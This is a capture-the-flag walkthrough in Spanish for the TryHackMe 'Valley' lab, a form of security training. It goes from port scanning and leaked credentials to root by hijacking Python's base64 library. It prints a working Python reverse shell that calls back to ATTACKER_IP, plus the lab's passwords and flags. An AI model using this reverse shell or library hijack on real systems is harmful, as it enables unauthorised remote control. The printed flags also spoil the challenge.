# TryHackMe Valley - Walkthrough

## Resumen
- **Dificultad:** Media
- **Objetivo:** Obtener acceso root y leer las flags de usuario y root

## Reconocimiento

### Escaneo de puertos
```bash
nmap -sV 10.65.166.173
```

**Puertos descubiertos:**
| Puerto | Servicio |
|--------|----------|
| 22/tcp | SSH (OpenSSH 8.2p1) |
| 80/tcp | HTTP (Apache 2.4.41) |
| 37370/tcp | FTP (vsFTPd 3.0.3) |

### Enumeración Web

1. **Página principal:** Valley Photo Co. - sitio de fotografía
2. **Directorios encontrados:**
   - `/gallery/` - Galería de imágenes
   - `/pricing/` - Precios
   - `/static/` - Imágenes

3. **Página oculta descoberta:** En `/static/00` se encontró un archivo de notas:
```
dev notes from valleyDev:
- add wedding photo examples
- redo the editing on #4
- remove /dev1243224123123
- check for SIEM alerts
```

4. **Panel de desarrollo:** `http://valley.thm/dev1243224123123/`
   - En el código JavaScript (`dev.js`) se encontró las credenciales hardcodeadas:
   ```javascript
   if (username === "siemDev" && password === "california")
   ```

## Acceso Inicial

### Método 1: FTP
```bash
ftp 10.65.166.173 37370
# Usuario: siemDev
# Password: california
```

Archivos encontrados en el FTP:
- `siemFTP.pcapng`
- `siemHTTP1.pcapng`
- `siemHTTP2.pcapng`

### Método 2: Análisis de PCAP
Analizando `siemHTTP2.pcapng` se encontró un POST con credenciales:
```
username=valleyDev&password=ph0t0s1234
```

### Acceso SSH
```bash
ssh valleyDev@10.65.166.173
# Password: ph0t0s1234
```

**Flag de usuario:** `THM{k@l1_1n_th3_v@lley}`

## Escalada de Privilegios

### 1. Enumeración del sistema
```bash
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

### 2. Análisis del binary `valleyAuthenticator`
- Descargado del sistema: `/home/valleyDev/valleyAuthenticator`
- Binary UPX-comprimido
- Extraído y analizado con `strings`

### 3. Obtención de hash MD5
En las strings del binary se encontraron hashes MD5:
- `e6722920bab2326f8217e4bf6b1b58ac`
- `dd2921cc76ee3abfd2beb60709056cfb`

### 4. Crackeo de contraseña
En crackstation.net:
- `e6722920bab2326f8217e4bf6b1b58ac` → `liberty123`

### 5. Cambio a usuario valley
```bash
su valley
# Password: liberty123
```

### 6. Explotación vía Python Library
1. Mover la librería original:
```bash
mv /usr/lib/python3.8/base64.py /usr/lib/python3.8/base64.bak.py
```

2. Crear reverse shell:
```python
#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",1234))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
run(["/bin/bash","-i"])
```

3. Activar el reverse shell:
```bash
python3 -c "import base64"
```

4. Receiving connection:
```bash
nc -lvnp 1234
```

### 7. Obtención de root
Una vez recibido el callback:
```bash
whoami  # root
cat /root/root.txt
```

**Flag de root:** `THM{r00t_1n_v4ll3y}`

## Vulnerabilidades Encontradas

1. **Credenciales hardcodeadas en JavaScript** - Panel de desarrollo expuesto
2. **Archivo PCAP con tráfico de red** - Credenciales en texto plano
3. **Binary con hash MD5 crackeable** - Password weak
4. **Permisos de escritura en /usr/lib** - Library hijacking

## Mitigaciones

1. No hardcodear credenciales en código cliente
2. Usar HTTPS y no dejar tráfico en texto plano
3. Usar passwords fuertes y no almacenar en MD5
4. Restringuir permisos de escritura en directorios de sistema
5. Implementar proper authentication y authorization